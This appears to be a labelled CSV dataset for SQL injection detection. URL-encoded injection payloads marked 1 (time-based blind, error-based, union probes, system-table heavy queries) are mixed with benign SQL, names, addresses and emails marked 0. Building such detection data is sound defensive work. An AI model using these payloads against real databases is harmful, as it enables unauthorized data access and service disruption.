Query,Label
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20prxm%20where%201267%20%20%3D%20%201267%20and%203580%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
brenda,0
5.65818E+15,0
SELECT * FROM who WHERE pure BETWEEN round09/01/1996believed AND four15/31/1996build,0
1%22%20and%208312%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2069%20%20%29%20%20%7C%7Cchr%20%20%28%20%2079%20%20%29%20%20%7C%7Cchr%20%20%28%20%20101%20%20%29%20%20%7C%7Cchr%20%20%28%20%2068%20%20%29%20%20%2C5%20%20%29%20%20--,1
-7845%27%20union%20all%20select%209574%2C9574%2C9574%2C9574%2C9574%2C9574%23,1
17154,0
1%20%20%29%20%20%20union%20all%20select%20null%2Cnull%23,1
murad@magadan.org.pe,0
17005940q,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20oqyo%20where%207995%20%20%3D%20%207995,1
SELECT week ( s )  FROM outside SELECT pot FROM during,0
"SELECT moreID AS ID, studied AS social FROM movement",0
1%22%20and%20elt%20%20%28%20%201210%20%20%3D%20%201210%2Csleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%22zhxm%22%20%20%3D%20%20%22zhxm,1
1%22%20where%206800%20%20%3D%20%206800%20procedure%20analyse%20%20%28%20%20extractvalue%20%20%28%20%209627%2Cconcat%20%20%28%20%200x5c%2C%20%20%28%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x4b774c75%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C1%20%20%29%20%20%23,1
"CREATE TABLE IF NOT EXISTS `zcf_submitlogs`  (  `id` int ( 6 )  unsigned NOT NULL AUTO_INCREMENT, `crmsubmitlogStatus` varchar ( 20 )  DEFAULT NULL, `crmsubmitlogDescribtion` longtext NOT NULL, `crmsubmitFormType` varchar ( 30 )  NOT NULL, PRIMARY KEY  (  id  )   )  ENGINE = InnoDB DEFAULT CHARSET = utf8",0
1%20%20%29%20%20%20where%201929%20%20%3D%20%201929%20and%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20fzno%20%20%29%20%20--,1
%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20%20%29,1
"SELECT * FROM being ORDER BY said ASC, coal DESC",0
1%22%20%20%29%20%20%20as%20bpmk%20where%206412%20%20%3D%20%206412%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,1
FROM  ( SELECT DISTINCT bend FROM village ),0
-3270%25%27%20or%20elt%20%20%28%20%209404%20%20%3D%20%203498%2C3498%20%20%29%20%20%20and%20%27%25%27%20%20%3D%20%20%27,1
-6587%27%20%20%29%20%20%20union%20all%20select%206349%2C6349%2C6349%2C6349%2C6349%2C6349%2C6349%2C6349%2C6349%2C6349--,1
1%22%20%20%29%20%20%20where%202473%20%20%3D%20%202473%20and%20make_set%20%20%28%20%206118%20%20%3D%20%207684%2C7684%20%20%29%20%20--,1
08109487d,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27juhi%27%20like%20%27juhi,1
SELECT MIN ( wood )  AS union FROM disease,0
1%27%20where%205455%20%20%3D%20%205455%20and%20sleep%20%20%28%20%205%20%20%29%20%20--,1
"SELECT * FROM label ORDER BY rocket, particularly",0
"SELECT cheeseID AS ID, obtain AS fed FROM stay",0
SELECT * FROM complex WHERE struck = 'chosen'  OR measure = 'blood',0
SELECT * FROM star WHERE Price NOT BETWEEN 10 AND 20,0
04or2ativ1,0
SELECT ACOS ( -0.8 ) ;,0
%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20srmq%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
canciano,0
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ),0
1%22%20%20%29%20%20%20or%206793%20%20%3D%20%20%20%20%28%20%20select%206793%20from%20pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%28%20%20%22lsis%22%20like%20%22lsis,1
"SELECT explainID AS ID, beautiful AS eager FROM with",0
-2962%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%201570%20%20%3D%20%20convert%20%20%28%20%20int%2C%20%20%28%20%20select%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%201570%20%20%3D%20%201570%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27hkjo%27%20%20%3D%20%20%27hkjo,1
1.62177E+15,0
SELECT * FROM judge WHERE rain = 'power'  OR pull = 'month',0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201.%3C%40%24%20union%20select%201%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201,1
-7624%27%20%20%29%20%20%20or%205903%20%20%3D%20%20%20%20%28%20%20%27qqpjq%27%7C%7C%20%20%28%20%20select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%20%20%29%20%20%7C%7C%27qzvzq%27%20%20%29%20%20%20and%20%20%20%28%20%20%27iwab%27%20%20%3D%20%20%27iwab,1
-1591%20where%203291%20%20%3D%20%203291%20union%20all%20select%203291%2C3291%2C3291%2C3291%2C3291%2C3291%2C3291%2C3291%2C3291%23,1
1%22%20and%20row%20%20%28%20%206237%2C7469%20%20%29%20%20%3E%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%206237%20%20%3D%20%206237%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x%20from%20%20%20%28%20%20select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%20%20%29%20%20a%20group%20by%20x%20%20%29,1
SELECT dollar,0
1%27%20%20%29%20%20%20and%203754%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203754%20%20%3D%20%203754%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%28%20%20%27ulkq%27%20%20%3D%20%20%27ulkq,1
-2548%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%205107%20%20%3D%20%208049--,1
SELECT AVG ( ice ) FROM universe,0
FROM  ( SELECT DISTINCT twice FROM larger ),0
"INSERT INTO vote ( flat, trap, card, score, correctly, law )  VALUES  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )",0
end%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%203673%20%20%3D%20%203673,1
SELECT * FROM least 3 SELECT * FROM love,0
nogueira de ramun,0
cholgua,0
hoeflich@movil-google.cx,0
SELECT stepped FROM necessary UNION ALL SELECT suppose FROM start ORDER BY lead,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%20%20%20%28%20%20select%202%2A%20%20%28%20%20if%20%20%20%28%20%20%20%20%28%20%20%20select%20%2A%20from%20%20%20%28%20%20select%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%208113%20%20%3D%20%208113%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20s%20%20%29%20%20%2C%208446744073709551610%2C%208446744073709551610%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22nobt%22%20%20%3D%20%20%22nobt,1
SELECT * FROM grew FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM weigh,0
sempronia,0
1%27%20in%20boolean%20mode%20%20%29%20%20%20or%20updatexml%20%20%28%20%201808%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201808%20%20%3D%20%201808%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C8666%20%20%29%20%20%23,1
"c/ aulencia, 84",0
1%22%20and%207756%20%20%3D%20%20dbms_utility.sqlid_to_sqlhash%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207756%20%20%3D%20%207756%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%22jgcv%22%20%20%3D%20%20%22jgcv,1
1%27%7C%7C%20%20%28%20%20select%20%27znba%27%20where%208323%20%20%3D%20%208323,1
wambsgan,0
SELECT COUNT ( DISTINCT visit )  FROM prove,0
ornela,0
1%27%20where%209994%20%20%3D%20%209994%20and%209660%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29%20%20--,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20char%20%20%28%20%20111%20%20%29%20%20%7C%7Cchar%20%20%28%20%2077%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%7C%7Cchar%20%20%28%20%2088%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27tvar%27%20%20%3D%20%20%27tvar,1
1%25%27%20%20%29%20%20%20or%20char%20%20%28%20%20119%20%20%29%20%20%7C%7Cchar%20%20%28%20%20100%20%20%29%20%20%7C%7Cchar%20%20%28%20%2099%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%201441%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
8.83352E+15,0
SELECT * FROM college WHERE thing = 'lake'  AND City = 'spider',0
esbarar,0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%204241%20%20%3D%20%20convert%20%20%28%20%20int%2C%20%20%28%20%20select%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204241%20%20%3D%20%204241%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27%25%27%20%20%3D%20%20%27,1
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%204386%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204386%20%20%3D%20%204386%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
select%20%2A%20from%20generate_series%20%20%28%20%201134%2C1134%2Ccase%20when%20%20%20%28%20%201134%20%20%3D%20%204909%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20limit%201--,1
yasna,0
SELECT AVG ( Price ) FROM available,0
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%203754%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203754%20%20%3D%20%203754%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
86943454g,0
1%22%20where%206686%20%20%3D%20%206686%20or%20elt%20%20%28%20%206272%20%20%3D%20%206272%2Csleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20--,1
SELECT CURRENT_TIMESTAMP (  )  + 1;,0
select%20%20%20%28%20%20case%20when%20%20%20%28%20%206179%20%20%3D%20%208476%20%20%29%20%20%20then%206179%20else%20cast%20%20%28%20%201%20as%20int%20%20%29%20%20/%20%20%28%20%20select%200%20from%20dual%20%20%29%20%20%20end%20%20%29%20%20%20from%20dual--,1
44923287d,0
philipp.castella@biopoint.vc,0
46793939w,0
1%27%2B%20%20%28%20%20select%20ukwc%20where%203008%20%20%3D%20%203008%20or%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20sddo%20%20%29%20%20%23,1
blancafort,0
SELECT * FROM shout WHERE means = 'eye'  OR sad = 'win',0
"SELECT islandID AS ID, skin AS because FROM thousand",0
pascuet landivar,0
1%27%7C%7C%20%20%28%20%20select%20%27mwmn%27%20where%205112%20%20%3D%20%205112%20or%20%20%20%28%20%20select%209173%20from%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%209173%20%20%3D%20%209173%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x%20from%20information_schema.character_sets%20group%20by%20x%20%20%29%20%20a%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%27,1
SELECT TOP 3 * FROM finest WHERE bread = 'secret',0
SELECT * FROM what WHERE by = 'quarter',0
us,0
SELECT edge,0
select%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
-3368%27%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%204913%2C4913%2C4913%2C4913%2C4913%2C4913%2C4913%2C4913%2C4913--,1
-8026%20or%20elt%20%20%28%20%208434%20%20%3D%20%204516%2C4516%20%20%29%20%20%23%20bsqo,1
56,0
DELETE FROM somehow WHERE factor = 'fruit',0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20jfae%20where%206684%20%20%3D%20%206684%20and%202716%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
SELECT afternoon,0
1%20where%207196%20%20%3D%20%207196%20or%208466%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x694a4745%20%20%20%29%20%20%20%20%29%20%20%20--,1
basilisa,0
SELECT COUNT ( DISTINCT yes )  FROM guide,0
SELECT * FROM bend  WHERE own NOT LIKE '[needle]%',0
SELECT * FROM with WHERE depth = 'wore'  OR feel = 'red',0
"SELECT Employees.affect, COUNT ( Orders.coldID )  AS jarFROM    ( OrdersINNER JOIN amount ON Orders.symbolID  =  Employees.silkID )",0
SELECT COUNT ( spoken )  FROM explanation,0
"logroo, 98, 5-d",0
-7776%27%20%20%29%20%20%20or%205023%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%205023%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205023%20%20%3D%20%205023%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20%27ihof%27%20%20%3D%20%20%27ihof,1
select%20%20%20%28%20%20case%20when%20%20%20%28%20%205423%20%20%3D%20%207706%20%20%29%20%20%20then%205423%20else%20cast%20%20%28%20%201%20as%20int%20%20%29%20%20/%20%20%28%20%20select%200%20from%20dual%20%20%29%20%20%20end%20%20%29%20%20%20from%20dual--,1
"UPDATE very SET anywhere =  'pressure', City =  'couple' WHERE pay =  but",0
SELECT TOP 3 * FROM suit WHERE seen = 'land' SELECT * FROM such,0
retiendas,0
alobras,0
28530,0
ull colmenares,0
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ),0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20nlfq%20where%203410%20%20%3D%20%203410%20or%20extractvalue%20%20%28%20%201297%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201297%20%20%3D%20%201297%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20--,1
"madrid, 27",0
-5360%27%20where%208178%20%20%3D%20%208178%20union%20all%20select%208178%2C8178%2C8178--,1
cerpa oitavn,0
SELECT * FROM port WHERE Price NOT BETWEEN 10 AND 20,0
marcos esculta,0
1%22%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
SELECT TOP 3 * FROM greatest WHERE western = 'brave' SELECT * FROM record,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%20null%23,1
"SELECT duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels AS engineer  FROM wherever",0
1%25%27%20or%20char%20%20%28%20%2068%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2097%20%20%29%20%20%7C%7Cchar%20%20%28%20%2085%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205389%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%27%25%27%20%20%3D%20%20%27,1
SELECT * FROM rather 3 SELECT * FROM prove,0
SELECT * FROM harbor FETCH FIRST 50 PERCENT ROWS ONLY,0
%22%5E%22,1
-2316%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%208519%20%20%3D%20%206010,1
SELECT AVG ( aware ) FROM ship,0
SELECT * FROM garden WHERE bear NOT LIKE '[hill]%',0
SELECT AVG ( Price ) FROM sail,0
"SELECT Employees.sugar, COUNT ( Orders.secretID )  AS situationFROM    ( OrdersINNER JOIN thrown ON Orders.morningID  =  Employees.butID )",0
or%20%27%27%20%27,1
1%20where%203744%20%20%3D%20%203744,1
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',0
-4925%22%20union%20all%20select%205686%2C5686%2C5686%2C5686%2C5686%2C5686%2C5686%23,1
SELECT * FROM did WHERE body = 'pound'  AND  ( pour = 'original' OR tank = 'course' ),0
elda,0
SELECT * FROM practical  WHERE every NOT LIKE '[calm]%',0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22ymss%22%20%20%3D%20%20%22ymss,1
-8369%20%20%29%20%20%20where%207234%20%20%3D%20%207234%20order%20by%201--,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20sjzf%20where%209997%20%20%3D%20%209997%20and%204193%20%20%3D%20%205408,1
SELECT * FROM automobile WHERE getting = 'move'  OR development = 'paid',0
"SELECT direction,engine FROM kitchen WHERE want = 'yes' UNION SELECT shut, even FROM behavior",0
SELECT DISTINCT darkness FROM lovely,0
SELECT MIN ( carefully )  AS dull FROM remarkable,0
64526656h,0
SELECT COUNT ( red )  FROM at,0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%2011%3C1%23%20union%20select%201%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201,1
1%27%20%20%29%20%20%20as%20fxid%20where%205926%20%20%3D%20%205926,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%20char%20%20%28%20%20111%20%20%29%20%20%7C%7Cchar%20%20%28%20%2077%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%7C%7Cchar%20%20%28%20%2088%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22vcjt%22%20like%20%22vcjt,1
6432,0
"SELECT column_name ( s )  FROM realize,needed",0
woolgar@awat.gov,0
SELECT * FROM rhyme WHERE slipped = 'lucky' FETCH FIRST 3 ROWS ONLY,0
1%20and%208514%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20%23%20miji,1
1%22%20%20%29%20%20%20where%209545%20%20%3D%20%209545%20and%209198%20%20%3D%20%209198--,1
